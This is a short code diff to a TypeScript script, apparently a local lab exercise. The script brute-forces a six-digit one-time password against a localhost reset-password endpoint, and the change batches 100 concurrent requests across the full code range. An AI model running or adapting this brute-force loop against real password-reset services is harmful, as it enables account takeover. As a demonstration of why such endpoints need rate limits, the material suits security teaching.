@@ -5,7 +5,7 @@ const app = express();
 
 app.use(express.json());
 
-async function main(otp: any) {
+async function sendReq(otp: string) {
   try {
     const response = await axios.post(
       "http://localhost:3000/reset-password",
@@ -22,9 +22,17 @@ async function main(otp: any) {
   }
 }
 
-for (let i = 800000; i < 900000; i++) {
-  //console.log(i);
-  main(i);
+//We'll do batching here.
+
+async function main() {
+  for (let i = 0; i < 999999; i += 100) {
+    console.log(i);
+    const p: any[] = [];
+    for (let j = 0; j <= 100; j++) {
+      p.push(sendReq((i + j).toString()));
+    }
+    await Promise.all(p); //First let the previous 100 finish only then move forward.
+  }
 }
 
-main("504516");
+main();
